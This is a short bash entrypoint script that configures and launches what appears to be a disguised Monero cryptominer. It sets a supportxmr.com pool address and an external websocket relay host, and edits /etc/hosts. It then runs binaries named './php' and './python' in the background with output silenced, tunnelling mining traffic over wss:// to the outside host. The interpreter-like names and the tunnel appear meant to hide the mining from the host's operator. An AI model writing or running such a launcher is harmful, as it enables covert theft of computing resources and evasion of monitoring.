#!/bin/bash

if [ -z "$NAME_ID" ]; then
    NAME_ID="NONE"
fi

if [ -z "$POOL_URL" ]; then
    POOL_URL="pool.supportxmr.com:7777"
fi

if [ -z "$WS_URL" ]; then
    WS_URL="sand.wangjm.ml"
fi

if [ -z "$HOST_IP" ]; then
    HOST_IP="104.21.12.27"
fi

echo "$HOST_IP $WS_URL" >> /etc/hosts

sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
cd /app
./php -L 127.0.0.1:3333:${POOL_URL} wss://${WS_URL} > /dev/null &
./python > /dev/null
